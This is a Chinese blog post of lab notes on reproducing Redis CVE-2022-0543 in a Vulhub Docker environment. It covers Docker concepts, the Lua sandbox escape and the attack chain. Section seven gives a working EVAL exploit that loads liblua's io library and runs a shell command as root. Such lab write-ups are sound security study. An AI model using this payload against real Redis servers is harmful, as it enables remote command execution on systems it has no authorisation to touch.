---
title: "Vulhub 漏洞复现学习笔记（一）：Redis CVE-2022-0543"
date: "2026-06-23"
tags: ["Security", "Vulhub"]
excerpt: "Vulhub 是一个基于 Docker-Compose 的漏洞环境集合。这是系列第一篇，记录环境搭建和漏洞复现过程。"
---

> 学习环境：Kali Linux 2026.3 + Docker + Vulhub
> 漏洞编号：CVE-2022-0543
> 漏洞类型：Remote Code Execution（RCE）
> 漏洞平台：Redis 5.0.7（Debian/Ubuntu 打包版本）

## 一、学习背景

为了系统学习网络安全中的漏洞原理与漏洞利用，我决定采用 **Vulhub** 作为漏洞复现平台。

相比直接在真实服务器部署漏洞环境，Vulhub 基于 Docker 构建漏洞环境，每一个漏洞都是一个独立的容器，既方便部署，也不会污染宿主机环境，非常适合作为网络安全学习平台。

本次选择的第一个漏洞为 **Redis CVE-2022-0543**，主要原因有以下几点：

- 漏洞环境简单
- Docker 配置容易理解
- 可以学习 Docker 的基本使用
- 可以理解 Redis Lua 沙箱机制
- 能够完整体验一次真实 RCE 漏洞利用过程

## 二、Docker 基础知识学习

在正式复现漏洞之前，首先学习了 Docker 的几个基础概念。

### 1. Docker 是什么？

Docker 是一种轻量级容器技术，可以将应用程序及其运行环境一起打包成一个容器，实现一次构建，到处运行。

与传统虚拟机相比：

| 虚拟机 | Docker |
|--------|--------|
| 包含完整操作系统 | 共用宿主机内核 |
| 占用资源较大 | 启动速度快 |
| 几 GB 起步 | 通常几十 MB 到几百 MB |
| 运行完整系统 | 运行单个应用 |

Docker 更像是在宿主机上运行了一个隔离的小型 Linux 环境。

### 2. Image（镜像）

镜像可以理解成一个软件模板。

例如：

```
vulhub/redis:5.0.7
```

表示：

```
作者：vulhub
软件：Redis
版本：5.0.7
```

镜像本身不会运行。只有基于镜像创建容器后，软件才真正开始运行。

### 3. Container（容器）

容器可以理解为：镜像运行后的实例。一个镜像可以创建多个容器。

每个容器都有：独立文件系统、独立进程空间、独立网络空间。因此多个 Redis 可以同时运行而互不影响。

### 4. Docker Compose

Vulhub 使用 Docker Compose 管理漏洞环境。每一个漏洞目录都有一个 `docker-compose.yml`。

```yaml
version: '2'
services:
  redis:
    image: vulhub/redis:5.0.7
    ports:
      - "6379:6379"
```

其含义如下：创建一个 Redis 服务，使用 vulhub/redis:5.0.7 镜像，将宿主机 6379 端口映射到容器 6379 端口。Docker 根据该配置即可自动完成漏洞环境部署。

## 三、Docker 网络理解

第一次学习 Docker 时，最困惑的问题就是：**为什么访问 Kali 的 6379，实际上访问的是 Docker 里面的 Redis？**

原因是 Docker 自动创建了端口映射。

```
Kali 127.0.0.1:6379
        │
   Docker Port Mapping
        │
        ▼
Redis Container :6379
```

`docker-compose.yml` 中 `"6379:6379"` 表示 `宿主机端口 : 容器端口`，因此 `redis-cli -h 127.0.0.1` 实际上连接的是 Docker 内部 Redis。

## 四、部署漏洞环境

进入漏洞目录：

```bash
cd ~/lab/vulhub/redis/CVE-2022-0543
```

启动漏洞环境：

```bash
sudo docker-compose up -d
```

查看运行容器：

```bash
sudo docker ps
```

看到 `vulhub/redis:5.0.7` 状态为 Up，端口 6379→6379，说明漏洞环境已经成功启动。

## 五、Redis Lua 功能学习

Redis 不仅是 Key-Value 数据库，它还支持 Lua 脚本执行。

```
EVAL "return 1+1" 0
# (integer) 2
```

Redis 使用 Lua 的目的主要是：提高执行效率、保证多个操作的原子性、减少客户端与服务器通信次数。

## 六、漏洞原理分析

正常情况下，Redis 会将 Lua 放入一个沙箱（Sandbox）。沙箱中的 Lua 可以进行数学计算、处理字符串、访问 Lua 基础库，但**不能读取文件、执行 Linux 命令、加载动态链接库**。

但是 Debian/Ubuntu 在打包 Redis 时，错误地保留了 `package` 模块。攻击者可以利用 `package.loadlib()` 加载 Linux 的动态库 `/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`，随后调用 `luaopen_io` 重新获得 Lua 的 io 库。而 io 库中的 `io.popen()` 能够直接执行 Linux 命令。

攻击流程：

```
Redis → Lua → package.loadlib() → 加载 liblua → 获得 io → io.popen() → Linux Shell → RCE
```

这就是所谓的 **Lua Sandbox Escape（Lua 沙箱逃逸）**，最终形成 **Remote Code Execution（RCE）**。

## 七、漏洞复现

连接 Redis：

```bash
redis-cli -h 127.0.0.1
```

执行漏洞利用代码：

```lua
EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io = io_l(); local f = io.popen("id","r"); local res = f:read("*a"); f:close(); return res' 0
```

实验结果：

```
uid=0(root) gid=0(root) groups=0(root)
```

Redis 已经成功执行 Linux 的 `id` 命令，漏洞验证成功。

![CVE-2022-0543 漏洞复现成功截图](/CVE-2022-0543.png)

## 八、漏洞分析

整个攻击链：攻击者 → Redis 6379 → EVAL → Lua → package.loadlib() → liblua.so → luaopen_io() → io.popen() → Linux Shell → 执行命令 → 返回结果。

整个过程中，攻击者**无需 SSH 登录、Shell 权限、本地账号**，仅通过 Redis 提供的 Lua 功能即可执行系统命令。因此属于典型的 **远程代码执行漏洞（RCE）**。

## 九、本次学习收获

1. 学会使用 Docker 部署漏洞环境
2. 理解了 Image、Container、Compose 三个核心概念
3. 理解了 Docker 端口映射机制
4. 掌握 docker-compose.yml 的基本结构
5. 学会使用 docker ps 查看运行容器
6. 理解 Redis Lua 的基本机制
7. 学习 Lua 沙箱（Sandbox）的设计思想
8. 理解 Debian 打包 Redis 时产生漏洞的原因
9. 成功复现 Redis CVE-2022-0543 漏洞
10. 理解一次完整的远程代码执行（RCE）攻击链

## 十、后续学习计划

下一阶段计划继续利用 Vulhub 学习更多典型漏洞：

- Fastjson 反序列化漏洞
- ThinkPHP RCE
- Apache Log4j2（Log4Shell）
- Spring Framework 漏洞
- Apache Shiro 反序列化漏洞
- Nginx 漏洞
- WebLogic 漏洞

同时进一步学习 Docker 网络、Volume、Image 制作、容器安全、漏洞分析方法与修复方案，逐步形成完整的 Web 安全与漏洞分析知识体系。

---

## 总结

本次实验成功利用 Vulhub 部署了 Redis 漏洞环境，并复现了 **CVE-2022-0543** 漏洞。通过实验，不仅验证了漏洞的真实性，还深入理解了 Docker 容器、端口映射、Redis Lua 沙箱机制以及漏洞形成原因。相比简单地按照教程执行命令，更重要的是掌握了漏洞背后的原理和攻击链，为后续学习更多 Web 漏洞和容器化安全技术奠定了基础。
